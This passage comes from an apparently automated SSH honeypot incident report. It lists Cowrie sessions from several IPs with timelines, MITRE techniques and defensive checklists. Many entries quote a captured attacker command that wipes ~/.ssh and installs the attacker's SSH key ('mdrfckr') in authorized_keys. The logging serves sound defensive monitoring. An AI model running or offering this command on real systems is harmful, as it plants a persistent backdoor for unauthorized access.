- [ ] Submit `172.174.46[.]118` to AbuseIPDB if not already reported
- [ ] Block `172.174.46[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-288ef196332a

| Field | Detail |
|---|---|
| **Source IP** | `45.164.39[.]253` |
| **First Seen** | 2026-06-22 05:55 |
| **Last Seen** | 2026-06-22 05:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 05:55:25` | `cowrie.session.connect` |
| `2026-06-22 05:55:25` | `cowrie.client.version` |
| `2026-06-22 05:55:26` | `cowrie.client.kex` |
| `2026-06-22 05:55:27` | `cowrie.login.success` |
| `2026-06-22 05:55:28` | `cowrie.session.params` |
| `2026-06-22 05:55:28` | `cowrie.command.input` |
| `2026-06-22 05:55:28` | `cowrie.command.failed` |
| `2026-06-22 05:55:29` | `cowrie.log.closed` |
| `2026-06-22 05:55:29` | `cowrie.session.params` |
| `2026-06-22 05:55:29` | `cowrie.command.input` |
| `2026-06-22 05:55:29` | `cowrie.session.file_download` |
| `2026-06-22 05:55:29` | `cowrie.log.closed` |
| `2026-06-22 05:55:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.164.39[.]253` to AbuseIPDB if not already reported
- [ ] Block `45.164.39[.]253` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bca2dc39af9f

| Field | Detail |
|---|---|
| **Source IP** | `45.164.39[.]253` |
| **First Seen** | 2026-06-22 05:55 |
| **Last Seen** | 2026-06-22 05:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 05:55:33` | `cowrie.session.connect` |
| `2026-06-22 05:55:33` | `cowrie.client.version` |
| `2026-06-22 05:55:34` | `cowrie.client.kex` |
| `2026-06-22 05:55:35` | `cowrie.login.success` |
| `2026-06-22 05:55:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.164.39[.]253` to AbuseIPDB if not already reported
- [ ] Block `45.164.39[.]253` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a9adaf37239

| Field | Detail |
|---|---|
| **Source IP** | `122.176.122[.]24` |
| **First Seen** | 2026-06-22 06:01 |
| **Last Seen** | 2026-06-22 06:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 06:01:33` | `cowrie.session.connect` |
| `2026-06-22 06:01:33` | `cowrie.client.version` |
| `2026-06-22 06:01:33` | `cowrie.client.kex` |
| `2026-06-22 06:01:33` | `cowrie.login.success` |
| `2026-06-22 06:01:33` | `cowrie.session.params` |
| `2026-06-22 06:01:33` | `cowrie.command.input` |
| `2026-06-22 06:01:33` | `cowrie.command.failed` |
| `2026-06-22 06:01:33` | `cowrie.log.closed` |
| `2026-06-22 06:01:33` | `cowrie.session.params` |
| `2026-06-22 06:01:33` | `cowrie.command.input` |
| `2026-06-22 06:01:33` | `cowrie.session.file_download` |
| `2026-06-22 06:01:33` | `cowrie.log.closed` |
| `2026-06-22 06:01:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.122[.]24` to AbuseIPDB if not already reported
- [ ] Block `122.176.122[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abe0d2ea7495

| Field | Detail |
|---|---|
| **Source IP** | `122.176.122[.]24` |
| **First Seen** | 2026-06-22 06:01 |
| **Last Seen** | 2026-06-22 06:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 06:01:35` | `cowrie.session.connect` |
| `2026-06-22 06:01:35` | `cowrie.client.version` |
| `2026-06-22 06:01:35` | `cowrie.client.kex` |
| `2026-06-22 06:01:35` | `cowrie.login.success` |
| `2026-06-22 06:01:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.122[.]24` to AbuseIPDB if not already reported
- [ ] Block `122.176.122[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-215eae1a603c

| Field | Detail |
|---|---|
| **Source IP** | `122.176.122[.]24` |
| **First Seen** | 2026-06-22 06:08 |
| **Last Seen** | 2026-06-22 06:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 06:08:39` | `cowrie.session.connect` |
| `2026-06-22 06:08:39` | `cowrie.client.version` |
| `2026-06-22 06:08:39` | `cowrie.client.kex` |
| `2026-06-22 06:08:39` | `cowrie.login.success` |
| `2026-06-22 06:08:39` | `cowrie.session.params` |
| `2026-06-22 06:08:39` | `cowrie.command.input` |
| `2026-06-22 06:08:39` | `cowrie.command.failed` |
| `2026-06-22 06:08:39` | `cowrie.log.closed` |
| `2026-06-22 06:08:40` | `cowrie.session.params` |
| `2026-06-22 06:08:40` | `cowrie.command.input` |
| `2026-06-22 06:08:40` | `cowrie.session.file_download` |
| `2026-06-22 06:08:40` | `cowrie.log.closed` |
| `2026-06-22 06:08:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.122[.]24` to AbuseIPDB if not already reported
- [ ] Block `122.176.122[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15089b43eb10

| Field | Detail |
|---|---|
| **Source IP** | `122.176.122[.]24` |
| **First Seen** | 2026-06-22 06:08 |
| **Last Seen** | 2026-06-22 06:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 06:08:41` | `cowrie.session.connect` |
| `2026-06-22 06:08:41` | `cowrie.client.version` |
| `2026-06-22 06:08:41` | `cowrie.client.kex` |
| `2026-06-22 06:08:41` | `cowrie.login.success` |
| `2026-06-22 06:08:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.122[.]24` to AbuseIPDB if not already reported
- [ ] Block `122.176.122[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c8b6360f07f

| Field | Detail |
|---|---|
| **Source IP** | `172.174.46[.]118` |
| **First Seen** | 2026-06-22 06:17 |
| **Last Seen** | 2026-06-22 06:17 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 06:17:22` | `cowrie.session.connect` |
| `2026-06-22 06:17:22` | `cowrie.client.version` |
| `2026-06-22 06:17:23` | `cowrie.client.kex` |
| `2026-06-22 06:17:24` | `cowrie.login.success` |
| `2026-06-22 06:17:31` | `cowrie.session.params` |
| `2026-06-22 06:17:31` | `cowrie.command.input` |
| `2026-06-22 06:17:31` | `cowrie.command.failed` |
| `2026-06-22 06:17:32` | `cowrie.log.closed` |
| `2026-06-22 06:17:35` | `cowrie.session.params` |
| `2026-06-22 06:17:35` | `cowrie.command.input` |
| `2026-06-22 06:17:36` | `cowrie.session.file_download` |
| `2026-06-22 06:17:36` | `cowrie.log.closed` |
| `2026-06-22 06:17:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.46[.]118` to AbuseIPDB if not already reported
- [ ] Block `172.174.46[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-528c62f04a62

| Field | Detail |
|---|---|
| **Source IP** | `172.174.46[.]118` |
| **First Seen** | 2026-06-22 06:17 |
| **Last Seen** | 2026-06-22 06:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 06:17:47` | `cowrie.session.connect` |
| `2026-06-22 06:17:47` | `cowrie.client.version` |
| `2026-06-22 06:17:48` | `cowrie.client.kex` |
| `2026-06-22 06:17:51` | `cowrie.login.success` |
| `2026-06-22 06:17:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.46[.]118` to AbuseIPDB if not already reported
- [ ] Block `172.174.46[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a836b21a1b5

| Field | Detail |
|---|---|
| **Source IP** | `122.176.122[.]24` |
| **First Seen** | 2026-06-22 06:31 |
| **Last Seen** | 2026-06-22 06:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 06:31:45` | `cowrie.session.connect` |
| `2026-06-22 06:31:45` | `cowrie.client.version` |
| `2026-06-22 06:31:45` | `cowrie.client.kex` |
| `2026-06-22 06:31:46` | `cowrie.login.success` |
| `2026-06-22 06:31:46` | `cowrie.session.params` |
| `2026-06-22 06:31:46` | `cowrie.command.input` |
| `2026-06-22 06:31:46` | `cowrie.command.failed` |
| `2026-06-22 06:31:46` | `cowrie.log.closed` |
| `2026-06-22 06:31:46` | `cowrie.session.params` |
| `2026-06-22 06:31:46` | `cowrie.command.input` |
| `2026-06-22 06:31:46` | `cowrie.session.file_download` |
| `2026-06-22 06:31:46` | `cowrie.log.closed` |
| `2026-06-22 06:31:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.122[.]24` to AbuseIPDB if not already reported
- [ ] Block `122.176.122[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82f9f63e89c2

| Field | Detail |
|---|---|
| **Source IP** | `122.176.122[.]24` |
| **First Seen** | 2026-06-22 06:31 |
| **Last Seen** | 2026-06-22 06:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 06:31:47` | `cowrie.session.connect` |
| `2026-06-22 06:31:47` | `cowrie.client.version` |
| `2026-06-22 06:31:47` | `cowrie.client.kex` |
| `2026-06-22 06:31:47` | `cowrie.login.success` |
| `2026-06-22 06:31:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.122[.]24` to AbuseIPDB if not already reported
- [ ] Block `122.176.122[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67a0fb2cdc44

| Field | Detail |
|---|---|
| **Source IP** | `122.176.122[.]24` |
| **First Seen** | 2026-06-22 06:38 |
| **Last Seen** | 2026-06-22 06:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 06:38:39` | `cowrie.session.connect` |
| `2026-06-22 06:38:39` | `cowrie.client.version` |
| `2026-06-22 06:38:39` | `cowrie.client.kex` |
| `2026-06-22 06:38:40` | `cowrie.login.success` |
| `2026-06-22 06:38:40` | `cowrie.session.params` |
| `2026-06-22 06:38:40` | `cowrie.command.input` |
| `2026-06-22 06:38:40` | `cowrie.command.failed` |
| `2026-06-22 06:38:40` | `cowrie.log.closed` |
| `2026-06-22 06:38:40` | `cowrie.session.params` |
| `2026-06-22 06:38:40` | `cowrie.command.input` |
| `2026-06-22 06:38:40` | `cowrie.session.file_download` |
| `2026-06-22 06:38:40` | `cowrie.log.closed` |
| `2026-06-22 06:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.122[.]24` to AbuseIPDB if not already reported
- [ ] Block `122.176.122[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01acd2c31bed

| Field | Detail |
|---|---|
| **Source IP** | `122.176.122[.]24` |
| **First Seen** | 2026-06-22 06:38 |
| **Last Seen** | 2026-06-22 06:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 06:38:41` | `cowrie.session.connect` |
| `2026-06-22 06:38:41` | `cowrie.client.version` |
| `2026-06-22 06:38:41` | `cowrie.client.kex` |
| `2026-06-22 06:38:42` | `cowrie.login.success` |
| `2026-06-22 06:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.122[.]24` to AbuseIPDB if not already reported
- [ ] Block `122.176.122[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf1751c40271

| Field | Detail |
|---|---|
| **Source IP** | `31.22.10[.]193` |
| **First Seen** | 2026-06-22 06:43 |
| **Last Seen** | 2026-06-22 06:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 06:43:52` | `cowrie.session.connect` |
| `2026-06-22 06:43:52` | `cowrie.client.version` |
| `2026-06-22 06:43:52` | `cowrie.client.kex` |
| `2026-06-22 06:43:53` | `cowrie.login.success` |
| `2026-06-22 06:43:53` | `cowrie.session.params` |
| `2026-06-22 06:43:53` | `cowrie.command.input` |
| `2026-06-22 06:43:53` | `cowrie.command.failed` |
| `2026-06-22 06:43:54` | `cowrie.log.closed` |
| `2026-06-22 06:43:54` | `cowrie.session.params` |
| `2026-06-22 06:43:54` | `cowrie.command.input` |
| `2026-06-22 06:43:54` | `cowrie.session.file_download` |
| `2026-06-22 06:43:54` | `cowrie.log.closed` |
| `2026-06-22 06:43:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.22.10[.]193` to AbuseIPDB if not already reported
- [ ] Block `31.22.10[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e085c856f1a

| Field | Detail |
|---|---|
| **Source IP** | `31.22.10[.]193` |
| **First Seen** | 2026-06-22 06:43 |
| **Last Seen** | 2026-06-22 06:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 06:43:57` | `cowrie.session.connect` |
| `2026-06-22 06:43:57` | `cowrie.client.version` |
| `2026-06-22 06:43:57` | `cowrie.client.kex` |
| `2026-06-22 06:43:57` | `cowrie.login.success` |
| `2026-06-22 06:43:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.22.10[.]193` to AbuseIPDB if not already reported
- [ ] Block `31.22.10[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a6246b11748

| Field | Detail |
|---|---|
| **Source IP** | `122.177.242[.]181` |
| **First Seen** | 2026-06-22 06:45 |
| **Last Seen** | 2026-06-22 06:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 06:45:39` | `cowrie.session.connect` |
| `2026-06-22 06:45:39` | `cowrie.client.version` |
| `2026-06-22 06:45:39` | `cowrie.client.kex` |
| `2026-06-22 06:45:39` | `cowrie.login.success` |
| `2026-06-22 06:45:39` | `cowrie.session.params` |
| `2026-06-22 06:45:39` | `cowrie.command.input` |
| `2026-06-22 06:45:39` | `cowrie.command.failed` |
| `2026-06-22 06:45:39` | `cowrie.log.closed` |
| `2026-06-22 06:45:39` | `cowrie.session.params` |
| `2026-06-22 06:45:39` | `cowrie.command.input` |
| `2026-06-22 06:45:39` | `cowrie.session.file_download` |
| `2026-06-22 06:45:39` | `cowrie.log.closed` |
| `2026-06-22 06:45:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.177.242[.]181` to AbuseIPDB if not already reported
- [ ] Block `122.177.242[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d54276f9f67e

| Field | Detail |
|---|---|
| **Source IP** | `122.177.242[.]181` |
| **First Seen** | 2026-06-22 06:45 |
| **Last Seen** | 2026-06-22 06:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 06:45:40` | `cowrie.session.connect` |
| `2026-06-22 06:45:40` | `cowrie.client.version` |
| `2026-06-22 06:45:40` | `cowrie.client.kex` |
| `2026-06-22 06:45:41` | `cowrie.login.success` |
| `2026-06-22 06:45:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.177.242[.]181` to AbuseIPDB if not already reported
- [ ] Block `122.177.242[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-606132f07676

| Field | Detail |
|---|---|
| **Source IP** | `122.176.122[.]24` |
| **First Seen** | 2026-06-22 06:54 |
| **Last Seen** | 2026-06-22 06:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
